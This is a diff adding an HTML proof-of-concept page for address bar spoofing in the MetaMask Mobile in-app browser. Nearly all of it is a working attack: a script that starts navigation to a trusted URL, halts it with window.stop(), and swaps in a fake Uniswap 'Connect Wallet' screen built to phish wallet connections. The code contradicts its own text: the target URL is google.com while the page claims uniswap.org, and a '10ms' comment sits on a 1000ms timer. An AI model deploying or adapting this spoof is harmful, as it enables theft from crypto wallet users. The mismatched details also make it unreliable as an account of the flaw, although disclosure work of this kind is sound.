@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>MetaMask Address Bar Spoofing POC</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+       .container {
+            text-align: center;
+            padding: 20px;
+            max-width: 400px;
+        }
+        h1 { font-size: 24px; margin-bottom: 20px; color: #ff5252; }
+        p { color: #aaaaaa; margin-bottom: 30px; }
+       .btn {
+            background-color: #2196f3;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+            transition: transform 0.1s;
+        }
+       .btn:active { transform: scale(0.98); }
+        
+        /* Styles to mimic a legitimate dApp after spoofing */
+       .spoofed-ui {
+            display: none;
+            background-color: #ffffff;
+            color: #000000;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 999;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 50px;
+        }
+       .spoofed-ui img { width: 80px; margin-bottom: 20px; }
+       .spoofed-ui h2 { font-weight: 500; }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="main-ui">
+        <h1>Security Vulnerability POC</h1>
+        <p>This page demonstrates an Address Bar Spoofing vulnerability in the MetaMask Mobile browser.</p>
+        <p>Clicking the button below will change the URL bar to <b>https://uniswap.org</b>, but you will remain on this malicious page.</p>
+        <button class="btn" onclick="executeSpoof()">Launch Spoof Attack</button>
+    </div>
+
+    <div class="spoofed-ui" id="fake-ui">
+        <div style="font-size: 50px;">🦄</div> 
+        <h2>Connect Wallet</h2>
+        <p style="color: #666;">Uniswap requires you to connect your wallet.</p>
+        <button class="btn" style="background-color: #ff007a;">Connect MetaMask</button>
+    </div>
+
+    <script>
+        function executeSpoof() {
+            const targetUrl = "https://google.com/csi";
+            
+            // 1. Trigger the navigation to the trusted URL
+            window.location.href = targetUrl;
+
+            // 2. Race Condition: Stop the navigation immediately.
+            // The delay (10ms) allows the 'onNavigationStateChange' event to fire
+            // in the React Native bridge, updating the address bar to the target URL.
+            // However, window.stop() prevents the WebView from actually loading it.
+            setTimeout(() => {
+                window.stop();
+                
+                // 3. UI Redressing: Replace the page content to mimic the target
+                document.getElementById('main-ui').style.display = 'none';
+                document.getElementById('fake-ui').style.display = 'flex';
+                
+                // At this point, the address bar says "uniswap.org", 
+                // but the user sees our fake HTML.
+                console.log("Spoof executed.");
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
